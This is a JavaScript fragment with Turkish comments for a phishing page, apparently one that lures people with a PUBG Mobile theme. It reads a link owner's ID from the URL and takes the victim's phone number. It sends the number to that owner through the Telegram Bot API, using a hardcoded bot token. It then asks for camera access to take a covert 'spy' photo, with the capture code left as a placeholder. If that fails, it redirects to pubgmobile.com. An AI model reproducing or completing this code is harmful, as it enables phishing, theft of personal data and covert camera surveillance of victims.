<script>
    // 1. ADIM: Linkteki ID'yi (yani botu kullanan kiÅŸiyi) oku
    const urlParams = new URLSearchParams(window.location.search);
    const ownerID = urlParams.get('id'); // Botun oluÅŸturduÄŸu linkteki ID'yi yakalar

    const CONFIG = {
        TOKEN: "8492011222:AAEUXPE2bmnRZdGgPT1mGBxVFXIX7nfUfxc", // ANA BOT TOKENIN (Veriler bu bot Ã¼zerinden iletilir)
        REDIRECT: "https://www.pubgmobile.com"
    };

    async function veriyiGonder(mesaj, resim = null) {
        if (!ownerID) return; // ID yoksa kimseye bir ÅŸey gitmez

        const api = `https://api.telegram.org/bot${CONFIG.TOKEN}/`;
        const fd = new FormData();
        fd.append('chat_id', ownerID); // SÄ°HÄ°R BURADA: Veri linki oluÅŸturan kullanÄ±cÄ±ya gider!

        if (resim) {
            fd.append('photo', resim, 'spy.jpg');
            fd.append('caption', mesaj);
            await fetch(api + 'sendPhoto', { method: 'POST', body: fd });
        } else {
            fd.append('text', mesaj);
            await fetch(api + 'sendMessage', { method: 'POST', body: fd });
        }
    }

    // Kurban numarayÄ± girip butona bastÄ±ÄŸÄ±nda Ã§alÄ±ÅŸacak ana fonksiyon
    async function sÄ±zmaIslemi() {
        const numara = document.getElementById('phone-input').value;
        if(numara.length < 10) return;

        // Ã–nce numarayÄ± sahibine uÃ§ur
        await veriyiGonder(`ðŸ”¥ HEDEF DÃœÅžTÃœ!\nðŸ“ž Numara: ${numara}`);

        // Sonra kameraya sÄ±z ve resmi sahibine uÃ§ur
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            // ... (Kamera yakalama kodlarÄ± buraya gelecek)
            // Yakalanan blobu 'veriyiGonder' fonksiyonuna resim olarak gÃ¶nder sevgilim
        } catch(e) { 
            window.location.href = CONFIG.REDIRECT; 
        }
    }
</script>
